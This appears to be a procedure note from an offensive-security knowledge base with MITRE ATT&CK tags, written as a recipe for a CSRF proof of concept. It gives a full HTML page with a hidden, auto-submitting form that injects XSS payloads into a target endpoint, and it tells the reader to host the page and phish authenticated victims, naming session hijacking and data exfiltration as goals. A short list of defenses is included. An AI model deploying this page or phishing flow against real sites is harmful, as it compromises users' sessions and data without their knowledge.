---
id: proc-uuid-2
tags:
  - csrf
  - poc
  - xss
type: procedure
tools:
  - '[[tools/Burp-Suite-Professional]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:43.213Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Create-and-Deliver-CSRF-Proof-of-Concept

## Summary

This procedure creates an HTML-based CSRF PoC that forces an authenticated user's browser to submit a form with XSS payloads to the vulnerable endpoint, exploiting the lack of protection to execute malicious JavaScript.

## Description

Once the vulnerability is confirmed, an attacker crafts a simple HTML page with a hidden form targeting the POST endpoint, pre-populated with decoded XSS like "><img src=x onerror=alert(document.domain)>. Auto-submission via JavaScript ensures the victim unwittingly triggers the attack when visiting the page, leading to JS execution in the target's context for data theft or phishing.

## Requirements

1. Confirmed vulnerable endpoint and XSS payload from prior testing
2. Hosting capability for the HTML PoC (e.g., attacker server or GitHub Pages)
3. Social engineering vector to deliver the link to victims (e.g., email, chat)

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookie policies (e.g., SameSite=Strict)
- Use Content Security Policy (CSP) to block inline scripts and unsafe eval
- Log and alert on form submissions with suspicious payloads

## Objectives

1. Trick victim into cross-origin form submission
2. Inject and trigger XSS for JS execution
3. Achieve session hijacking or data exfiltration

## Instructions

### Step 1: Generate HTML PoC

**Context**: Create the HTML file with hidden form and auto-submit.

No command; manually write the file as shown below.

Example PoC content:
```html
<!DOCTYPE html>
<html><body>
<form action="https://target.com/schedule" method="POST" style="display:none;">
<input name="schedule-building" value="><img src=x onerror=alert(document.domain)>">
<input name="schedule-classroom" value="><img src=x onerror=alert(document.domain)>">
<input name="schedule-course" value="><img src=x onerror=alert(document.domain)>">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

### Step 2: Host and Deliver

**Context**: Upload to a server and send link to victim while authenticated.

Use Burp or browser to test locally first, then deliver via phishing.

**Expected Output**: Upon visit, form submits silently, XSS executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite-Professional]]

## Tags

- [[csrf]]
- [[poc]]
